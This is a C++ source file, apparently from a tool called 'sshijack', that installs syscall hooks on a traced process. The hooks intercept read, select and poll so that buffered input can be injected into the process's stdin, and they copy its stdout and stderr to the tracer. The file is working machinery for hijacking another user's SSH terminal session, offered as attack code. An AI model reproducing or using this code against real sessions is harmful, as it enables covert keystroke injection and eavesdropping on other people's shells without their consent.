#include <stdio.h>
#include "syscalls.h"
#include "sshijack.h"
#include "buffer.h"
#include <vector>
#include <sys/syscall.h>
#include <sys/select.h>
#include <poll.h>

using namespace std;

vector<hookPtr> preSyscall;
vector<hookPtr> fakedSyscall;
vector<hookPtr> postSyscall;

inline void addHook(vector<hookPtr> &v, int syscall, hookPtr ptr)
{
	if(syscall < 0)
		return; // Fail silently. Who told you to hook negative syscalls? 
	
	if(v.size() <= (unsigned int)syscall)
	{
		v.resize(syscall + 1, NULL);
	}
	v[syscall] = ptr;
}

inline hookPtr getHook(vector<hookPtr> &v, int syscall)
{
	if(syscall < 0 || v.size() <= (unsigned int)syscall)
		return NULL;
	return v[syscall];
	/* This version, while pretty, REALLY sucks performance-wise!
	try
	{
		return v.at(syscall);
	} catch(std::out_of_range e)
	{
		return NULL;
	}*/
}

hookPtr getPreHook(int syscall)
{
	return getHook(preSyscall, syscall);
}

hookPtr getFakedHook(int syscall)
{
	return getHook(fakedSyscall, syscall);
}

hookPtr getPostHook(int syscall)
{
	return getHook(postSyscall, syscall);
}

buffer inputBuffer;

// ============= HOOKS =============
void preReadHook(processInfo *pi, user_regs_struct &regs, int &saveRegs, int &fakeSyscall)
{
	if(inputBuffer.lockedSize() && regs.ARG1 == 0)
	{
		dprintf("Syscall: 0x%lx\tfd: 0x%lx\tbuf: 0x%lx\tcount: 0x%lx\n", regs.ORIG_RAX, regs.ARG1, regs.ARG2, regs.ARG3);
		fakeSyscall = 1;
	}
}

void fakedReadHook(processInfo *pi, user_regs_struct &regs, int &saveRegs, int &unused)
{
	//ssize_t read(int fd, void *buf, size_t count);
	//eax read(ebx fd, ecx *buf, edx count);
	unsigned int len = inputBuffer.lockedSize();
	if(regs.ARG3 < len)
		len = regs.ARG3;
	
	inputBuffer.lock();
	for(unsigned int i = 0; i < len; i++)
	{
		char c = inputBuffer.get();
		pi->writeChar(regs.ARG2 + i, c);
	}
	inputBuffer.unlock();
	regs.RAX = len;
	
	saveRegs = 1;
}

void preWriteHook(processInfo *pi, user_regs_struct &regs, int &saveRegs, int &fakeSyscall)
{
	// ssize_t write(int fd, const void *buf, size_t count);
	//ssize_t retval = write(regs.ARG1, regs.ARG2, regs.ARG3);
	//write(stdout, regs.ARG2, regs.ARG3);
	dprintf("Got a write syscall!\n");
	dprintf("fd = %d\n", (int)regs.ARG1);
	if(regs.ARG1 == 1 /*stdout*/ || regs.ARG1 == 2 /*stderr*/ )
	{
		for(unsigned int i = 0; i < regs.ARG3; i++)
		{
			unsigned long c = pi->getValue(regs.ARG2 + i);
			dprintf("Wrote letter: ");
			printf("%c", (int)c);
			dprintf("\n");
		}
		fflush(stdout);
	}
	
	//return retval;
}

void preSelectHook(processInfo *pi, user_regs_struct &regs, int &saveRegs, int &fakeSyscall)
{
	//int maxDwords = sizeof(fd_set) / sizeof(__fd_mask);
	//printf("MaxDwords: %d\n", maxDwords);
	fd_set inSet;
	if(regs.ARG2 && inputBuffer.lockedSize())
	{
		pi->readMemcpy(&inSet, regs.ARG2, sizeof(fd_set));
		if(FD_ISSET(0, &inSet))
		{
			fakeSyscall = 1;
		}
	}
	
}

void fakeSelectHook(processInfo *pi, user_regs_struct &regs, int &saveRegs, int &unused)
{
	regs.RAX = 0;
	
	// readfds
	if(regs.ARG2 && inputBuffer.lockedSize())
	{
		fd_set readSet;
		pi->readMemcpy(&readSet, regs.ARG2, sizeof(fd_set));
		FD_ZERO(&readSet);
		FD_SET(0, &readSet);
		pi->writeMemcpy(regs.ARG2, &readSet, sizeof(fd_set));
		
		regs.RAX += 1;
	}
	
	// writefds
	if(regs.ARG3)
	{
		fd_set writeSet;
		pi->readMemcpy(&writeSet, regs.ARG3, sizeof(fd_set));
		FD_ZERO(&writeSet);
		pi->writeMemcpy(regs.ARG3, &writeSet, sizeof(fd_set));
	}
	
	// exceptfds
	if(regs.ARG4
		&& regs.ARG4 != (unsigned long)-1 // Nano temporary workaround
		)
	{
		fd_set exceptSet;
		pi->readMemcpy(&exceptSet, regs.ARG4, sizeof(fd_set));
		FD_ZERO(&exceptSet);
		pi->writeMemcpy(regs.ARG4, &exceptSet, sizeof(fd_set));
	}
/*	if(regs.ARG4 == (unsigned long)-1)
	{
		printf("Nano, srsly, WTF?!?\n");
		printf("EIP: %lx\n", regs.rip);
		
	}
*/
	saveRegs = 1;
}

void prePollHook(processInfo *pi, user_regs_struct &regs, int &saveRegs, int &fakeSyscall)
{
	// int poll(struct pollfd *fds, nfds_t nfds, int timeout);
	if(regs.ARG2 && inputBuffer.lockedSize())
	{
		pollfd fds[regs.ARG2];
		pi->readMemcpy(&fds, regs.ARG1, regs.ARG2 * sizeof(pollfd));
		
		for(unsigned int i = 0; i < regs.ARG2; i++)
		{
			if(fds[i].fd == 0 && (fds[0].events & POLLIN))
			{
				fakeSyscall = 1;
				return;
			}
		}
	}
}

void fakePollHook(processInfo *pi, user_regs_struct &regs, int &saveRegs, int &unused)
{
	regs.RAX = 0;
	
	if(regs.ARG2 && inputBuffer.lockedSize())
	{
		pollfd fds[regs.ARG2];
		pi->readMemcpy(&fds, regs.ARG1, regs.ARG2 * sizeof(pollfd));
		
		for(unsigned int i = 0; i < regs.ARG2; i++)
		{
			if(fds[i].fd == 0 && (fds[0].events & POLLIN))
			{
				fds[0].revents = POLLIN;
				regs.RAX += 1;
			}
			else
				fds[0].revents = 0;
		}
		
		pi->writeMemcpy(regs.ARG1, &fds, regs.ARG2 * sizeof(pollfd));
	}
	
	saveRegs = 1;
}

// ======== END OF HOOKS ===========

//void prePollHook(processInfo *pi, user_regs_struct &regs, int &saveRegs, int &fakeSyscall)
//void fakePollHook(processInfo *pi, user_regs_struct &regs, int &saveRegs, int &unused)

void initSyscallHooks()
{
	addHook(preSyscall, SYS_write, preWriteHook);
	addHook(preSyscall, SYS_read, preReadHook);
	addHook(fakedSyscall, SYS_read, fakedReadHook);
	addHook(preSyscall, SYS_select, preSelectHook);
	addHook(fakedSyscall, SYS_select, fakeSelectHook);
	addHook(preSyscall, SYS_poll, prePollHook);
	addHook(fakedSyscall, SYS_poll, fakePollHook);
}
